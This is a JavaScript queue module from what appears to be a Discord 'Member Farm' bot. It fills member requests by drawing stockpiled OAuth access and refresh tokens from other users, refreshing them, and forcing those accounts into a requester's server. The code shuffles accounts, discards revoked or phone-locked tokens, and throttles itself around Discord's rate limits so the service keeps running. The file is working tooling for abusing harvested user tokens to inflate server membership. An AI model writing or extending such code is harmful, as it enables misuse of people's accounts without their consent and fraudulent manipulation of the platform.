// language: JavaScript, file: queue.js — smart retry, delivery report, anti double-join
const { EmbedBuilder } = require('discord.js');
const { query, one, many, getSetting, setSetting } = require('./db');
const config = require('./config');
const { joinGuild, ensureFreshToken, refreshAccessToken } = require('./oauth');
const logs = require('./logs');
const { getEmbedColor } = require('./embed_util');

const MAX_ATTEMPTS = 5;
const BASE_BACKOFF_SEC = 45;

async function ensureQueueColumns() {
  await query(`ALTER TABLE queue ADD COLUMN IF NOT EXISTS attempts INTEGER DEFAULT 0`).catch(() => {});
  await query(`ALTER TABLE queue ADD COLUMN IF NOT EXISTS next_attempt_at BIGINT`).catch(() => {});
  await query(`ALTER TABLE queue ADD COLUMN IF NOT EXISTS last_error TEXT`).catch(() => {});
  await query(`ALTER TABLE joins ADD COLUMN IF NOT EXISTS queue_id INTEGER`).catch(() => {});
}

async function getQueue() {
  return many(
    `SELECT * FROM queue WHERE status = 'pending' ORDER BY priority DESC, position ASC, id ASC`
  );
}

async function addToQueue(guildId, requesterId, amount) {
  const row = await one(`SELECT COUNT(*)::int AS c FROM queue WHERE status = 'pending'`);
  if (row.c >= config.QUEUE_MAX) return { ok: false, reason: 'queue_full' };
  // Prevent duplicate pending job same user+guild
  const dup = await one(
    `SELECT id FROM queue WHERE status IN ('pending','processing') AND guild_id = $1 AND requester_id = $2 LIMIT 1`,
    [String(guildId), String(requesterId)]
  );
  if (dup) return { ok: false, reason: 'duplicate', id: dup.id };
  const pos = row.c + 1;
  const info = await one(
    `INSERT INTO queue (guild_id, requester_id, amount, position, attempts) VALUES ($1, $2, $3, $4, 0) RETURNING id`,
    [String(guildId), String(requesterId), amount, pos]
  );
  return { ok: true, id: info.id, position: pos };
}

async function clearQueue() {
  await query(`UPDATE queue SET status = 'cleared' WHERE status IN ('pending','processing')`);
}

async function removeFromQueue(guildId) {
  await query(`UPDATE queue SET status = 'removed' WHERE guild_id = $1 AND status IN ('pending','processing')`, [
    String(guildId),
  ]);
  await reindex();
}

async function clearUserQueue(userId) {
  await query(`UPDATE queue SET status = 'banfarm' WHERE requester_id = $1 AND status IN ('pending','processing')`, [
    String(userId),
  ]);
  await reindex();
}

async function reindex() {
  const rows = await getQueue();
  for (let i = 0; i < rows.length; i++) {
    await query('UPDATE queue SET position = $1 WHERE id = $2', [i + 1, rows[i].id]);
  }
}

async function setPriority(guildId) {
  await query(`UPDATE queue SET priority = 1 WHERE guild_id = $1 AND status = 'pending'`, [
    String(guildId),
  ]);
  await reindex();
}

async function moveQueue(guildId, newPos) {
  const rows = await getQueue();
  const target = rows.find((r) => r.guild_id === guildId);
  if (!target) return false;
  const filtered = rows.filter((r) => r.guild_id !== guildId);
  filtered.splice(Math.max(0, newPos - 1), 0, target);
  for (let i = 0; i < filtered.length; i++) {
    await query('UPDATE queue SET position = $1 WHERE id = $2', [i + 1, filtered[i].id]);
  }
  return true;
}

async function pauseQueue() {
  await setSetting('queue_paused', '1');
}
async function resumeQueue() {
  await setSetting('queue_paused', '0');
}
async function isPaused() {
  return (await getSetting('queue_paused', '0')) === '1';
}

async function bumpRateLimit() {
  const now = Date.now();
  const windowMs = 60_000;
  const key = 'rate_limit_hits';
  const raw = await getSetting(key, '[]');
  let hits = [];
  try {
    hits = JSON.parse(raw) || [];
  } catch {
    hits = [];
  }
  hits = hits.filter((t) => now - t < windowMs);
  hits.push(now);
  await setSetting(key, JSON.stringify(hits));
  if (hits.length >= 5) {
    await pauseQueue();
    return true;
  }
  return false;
}

function shuffle(arr) {
  const a = arr.slice();
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

function backoffSeconds(attempts) {
  return Math.min(BASE_BACKOFF_SEC * Math.pow(2, Math.max(0, attempts - 1)), 900);
}

async function claimNextJob() {
  await ensureQueueColumns();
  const now = Math.floor(Date.now() / 1000);
  // Recover stuck processing > 10 min
  await query(
    `UPDATE queue SET status = 'pending'
     WHERE status = 'processing' AND created_at < $1`,
    [now - 600]
  ).catch(() => {});

  const item = await one(
    `UPDATE queue SET status = 'processing'
     WHERE id = (
       SELECT id FROM queue
       WHERE status = 'pending'
         AND (next_attempt_at IS NULL OR next_attempt_at <= $1)
       ORDER BY priority DESC, position ASC, id ASC
       FOR UPDATE SKIP LOCKED
       LIMIT 1
     )
     RETURNING *`,
    [now]
  );
  return item;
}

async function alreadyJoinedThisJob(queueId, tokenId, guildId) {
  const row = await one(
    `SELECT 1 FROM joins WHERE success = 1 AND guild_id = $1 AND token_id = $2 AND (queue_id = $3 OR queue_id IS NULL)
     LIMIT 1`,
    [String(guildId), tokenId, queueId]
  );
  if (row) return true;
  // Also block any prior successful join of this token into guild (anti double-join)
  const any = await one(
    `SELECT 1 FROM joins WHERE success = 1 AND guild_id = $1 AND token_id = $2 LIMIT 1`,
    [String(guildId), tokenId]
  );
  return !!any;
}

async function sendDeliveryReport(client, item, stats) {
  const color = await getEmbedColor();
  const failed =
    (stats.maxed || 0) +
    (stats.phoneLocked || 0) +
    (stats.deauthorized || 0) +
    (stats.banned || 0) +
    (stats.transient || 0);
  const embed = new EmbedBuilder()
    .setTitle('Delivery Report')
    .setColor(stats.joined > 0 ? 0x57f287 : 0xed4245)
    .setDescription(
      'Queue job for server `' +
        item.guild_id +
        '` has finished processing.\n_No account tokens are included in this report._'
    )
    .addFields(
      { name: 'Requested', value: '`' + item.amount + '`', inline: true },
      { name: 'Joined', value: '`' + stats.joined + '`', inline: true },
      { name: 'Already in', value: '`' + stats.alreadyIn + '`', inline: true },
      { name: 'Skipped (full / locked)', value: '`' + ((stats.maxed || 0) + (stats.phoneLocked || 0)) + '`', inline: true },
      { name: 'Auth issues', value: '`' + (stats.deauthorized || 0) + '`', inline: true },
      { name: 'Temporary failures', value: '`' + (stats.transient || 0) + '`', inline: true },
      { name: 'Status', value: '`' + stats.status + '`', inline: true },
      { name: 'Attempt', value: '`' + (item.attempts || 0) + '/' + MAX_ATTEMPTS + '`', inline: true }
    )
    .setFooter({ text: 'Member Farm · delivery' })
    .setTimestamp();

  try {
    const user = await client.users.fetch(item.requester_id).catch(() => null);
    if (user) await user.send({ embeds: [embed] }).catch(() => {});
  } catch (e) {
    console.error('delivery dm', e.message);
  }

  // Also farm log without tokens
  try {
    logs.farmLog(
      client,
      'Delivery · guild `' + item.guild_id + '`',
      'Requester <@' +
        item.requester_id +
        '> · joined `' +
        stats.joined +
        '` / `' +
        item.amount +
        '` · status `' +
        stats.status +
        '`',
      stats.joined > 0 ? 0x57f287 : 0xfaa61a
    );
  } catch {}
}

async function processOne(client) {
  if (await isPaused()) return;
  if (!client?.user) return;

  let item;
  try {
    item = await claimNextJob();
  } catch (e) {
    console.error('claimNextJob', e.message);
    // Fallback without SKIP LOCKED if SQL variant fails
    item = await one(
      `SELECT * FROM queue WHERE status = 'pending' AND (next_attempt_at IS NULL OR next_attempt_at <= $1)
       ORDER BY priority DESC, position ASC LIMIT 1`,
      [Math.floor(Date.now() / 1000)]
    );
    if (item) {
      await query(`UPDATE queue SET status = 'processing' WHERE id = $1 AND status = 'pending'`, [item.id]);
    }
  }
  if (!item) return;

  const attempts = (item.attempts || 0) + 1;

  let stock = await many(
    `SELECT s.token_id, t.id AS tid, t.access_token, t.refresh_token, t.expires_at, t.user_id
     FROM stock s
     JOIN tokens t ON t.id = s.token_id
     WHERE t.valid = 1`
  );

  if (!stock.length) {
    await query(`UPDATE queue SET status = 'failed_nostock', attempts = $1, last_error = 'no_stock' WHERE id = $2`, [
      attempts,
      item.id,
    ]);
    if (client) {
      logs.farmLog(
        client,
        'Queue failed — no stock',
        `Guild \`${item.guild_id}\` · requester <@${item.requester_id}>`,
        0xed4245
      );
      await sendDeliveryReport(client, { ...item, attempts }, {
        joined: 0,
        alreadyIn: 0,
        maxed: 0,
        phoneLocked: 0,
        deauthorized: 0,
        banned: 0,
        transient: 0,
        status: 'failed_nostock',
      });
    }
    await reindex();
    try {
      await require('./live').refreshLiveAll(client);
    } catch {}
    return;
  }

  stock = shuffle(stock);

  let joined = 0,
    alreadyIn = 0,
    maxed = 0,
    phoneLocked = 0,
    deauthorized = 0;
  let terminated = 0,
    banned = 0,
    transient = 0;
  let hitRateLimit = false;

  for (const s of stock) {
    if (joined >= item.amount) break;
    try {
      if (await alreadyJoinedThisJob(item.id, s.token_id, item.guild_id)) {
        alreadyIn++;
        continue;
      }

      const guild = client.guilds.cache.get(item.guild_id);
      if (guild) {
        const existing = await guild.members.fetch(s.user_id).catch(() => null);
        if (existing) {
          alreadyIn++;
          await query(
            `INSERT INTO joins (guild_id, token_id, requester_id, success, detail, queue_id) VALUES ($1, $2, $3, 0, 'already', $4)`,
            [item.guild_id, s.token_id, item.requester_id, item.id]
          );
          continue;
        }
      }

      let access = await ensureFreshToken({
        id: s.tid || s.token_id,
        access_token: s.access_token,
        refresh_token: s.refresh_token,
        expires_at: s.expires_at,
      });

      try {
        const gr = await fetch('https://discord.com/api/v10/users/@me/guilds', {
          headers: { Authorization: 'Bearer ' + access },
        });
        if (gr.status === 200) {
          const glist = await gr.json();
          if (Array.isArray(glist) && glist.length >= 100) {
            maxed++;
            await query('DELETE FROM stock WHERE token_id = $1', [s.token_id]);
            await query(
              `INSERT INTO joins (guild_id, token_id, requester_id, success, detail, queue_id) VALUES ($1, $2, $3, 0, 'maxed_guilds', $4)`,
              [item.guild_id, s.token_id, item.requester_id, item.id]
            );
            continue;
          }
          if (Array.isArray(glist) && glist.some((g) => String(g.id) === String(item.guild_id))) {
            alreadyIn++;
            await query(
              `INSERT INTO joins (guild_id, token_id, requester_id, success, detail, queue_id) VALUES ($1, $2, $3, 0, 'already', $4)`,
              [item.guild_id, s.token_id, item.requester_id, item.id]
            );
            continue;
          }
        }
      } catch {}

      let result = await joinGuild(access, item.guild_id, s.user_id);

      if (!result.ok && result.code === 'deauth' && s.refresh_token) {
        const forced = await refreshAccessToken({
          id: s.tid || s.token_id,
          refresh_token: s.refresh_token,
        });
        if (forced) {
          access = forced;
          result = await joinGuild(access, item.guild_id, s.user_id);
        }
      }

      if (result.ok && result.code === 'joined') {
        joined++;
        await query(
          `INSERT INTO joins (guild_id, token_id, requester_id, success, detail, queue_id) VALUES ($1, $2, $3, 1, 'joined', $4)`,
          [item.guild_id, s.token_id, item.requester_id, item.id]
        );
        console.log('joined user=' + s.user_id + ' -> guild=' + item.guild_id + ' (stock kept)');
      } else if (result.ok && result.code === 'already') {
        alreadyIn++;
        await query(
          `INSERT INTO joins (guild_id, token_id, requester_id, success, detail, queue_id) VALUES ($1, $2, $3, 0, 'already', $4)`,
          [item.guild_id, s.token_id, item.requester_id, item.id]
        );
      } else {
        const code = result.code;
        if (code === 'rate_limit') {
          transient++;
          hitRateLimit = true;
          const triggered = await bumpRateLimit();
          if (triggered && client) {
            logs.adminLog(client, 'AntiRaid Triggered', 'Queue paused after repeated 429s.');
          }
          break;
        } else if (code === 'deauth') {
          deauthorized++;
          await query('UPDATE tokens SET valid = 0 WHERE id = $1', [s.token_id]);
          await query('DELETE FROM stock WHERE token_id = $1', [s.token_id]);
        } else if (code === 'maxed') {
          maxed++;
          await query('DELETE FROM stock WHERE token_id = $1', [s.token_id]);
        } else if (code === 'phone') {
          phoneLocked++;
          await query('DELETE FROM stock WHERE token_id = $1', [s.token_id]);
        } else if (code === 'banned') {
          banned++;
        } else {
          transient++;
        }
        await query(
          `INSERT INTO joins (guild_id, token_id, requester_id, success, detail, queue_id) VALUES ($1, $2, $3, 0, $4, $5)`,
          [item.guild_id, s.token_id, item.requester_id, code || 'error', item.id]
        );
      }
      await new Promise((r) => setTimeout(r, 500));
    } catch (e) {
      transient++;
      console.error('join fail', e.message);
    }
  }

  // Partial progress: reduce remaining amount for retries
  const remaining = Math.max(0, item.amount - joined);
  let status;
  let nextAttempt = null;
  let lastError = null;

  if (joined >= item.amount) {
    status = 'done';
  } else if (joined > 0 && remaining > 0 && (transient > 0 || hitRateLimit) && attempts < MAX_ATTEMPTS) {
    // Partial success + transient → retry for the rest
    status = 'pending';
    nextAttempt = Math.floor(Date.now() / 1000) + backoffSeconds(attempts);
    lastError = hitRateLimit ? 'rate_limit' : 'transient_partial';
    await query(`UPDATE queue SET amount = $1 WHERE id = $2`, [remaining, item.id]);
  } else if (joined === 0 && (transient > 0 || hitRateLimit) && attempts < MAX_ATTEMPTS) {
    status = 'pending';
    nextAttempt = Math.floor(Date.now() / 1000) + backoffSeconds(attempts);
    lastError = hitRateLimit ? 'rate_limit' : 'transient';
  } else if (joined > 0) {
    status = 'done';
  } else {
    status = 'failed';
    lastError = 'exhausted';
  }

  await query(
    `UPDATE queue SET status = $1, attempts = $2, next_attempt_at = $3, last_error = $4 WHERE id = $5`,
    [status, attempts, nextAttempt, lastError, item.id]
  );

  if (joined > 0) {
    await query(
      `INSERT INTO profiles (user_id, members_received, commands_used, last_command_at)
       VALUES ($2, $1, 0, EXTRACT(EPOCH FROM NOW())::BIGINT)
       ON CONFLICT (user_id) DO UPDATE SET
         members_received = profiles.members_received + $1,
         last_command_at = EXTRACT(EPOCH FROM NOW())::BIGINT`,
      [joined, item.requester_id]
    );
  }

  const reportStatus =
    status === 'pending' ? 'retry_scheduled' : status;

  // Delivery report when finished or partial final; also when retry scheduled (inform)
  await sendDeliveryReport(client, { ...item, attempts }, {
    joined,
    alreadyIn,
    maxed,
    phoneLocked,
    deauthorized,
    banned,
    transient,
    status: reportStatus,
  });

  try {
    const user = await client.users.fetch(item.requester_id).catch(() => null);
    logs.djoinLog(client, {
      userTag: user?.tag || item.requester_id,
      userId: item.requester_id,
      guildId: item.guild_id,
      joined,
      alreadyIn,
      maxed,
      phoneLocked,
      deauthorized,
      terminated,
      banned,
      transient,
      stockLeft: (await one('SELECT COUNT(*)::int AS c FROM stock s JOIN tokens t ON t.id = s.token_id WHERE t.valid = 1')).c,
      tier: 'x' + item.amount,
    });
  } catch (e) {
    console.error('djoin log', e.message);
  }

  console.log(
    'queue item ' + item.id + ' joined=' + joined + ' status=' + status + ' attempt=' + attempts +
      (nextAttempt ? ' next=' + nextAttempt : '')
  );
  await reindex();
  try {
    await require('./live').refreshLiveAll(client);
  } catch (e) {
    console.error('live refresh', e.message);
  }
}

module.exports = {
  getQueue,
  addToQueue,
  clearQueue,
  removeFromQueue,
  clearUserQueue,
  setPriority,
  moveQueue,
  pauseQueue,
  resumeQueue,
  isPaused,
  processOne,
  reindex,
  ensureQueueColumns,
};
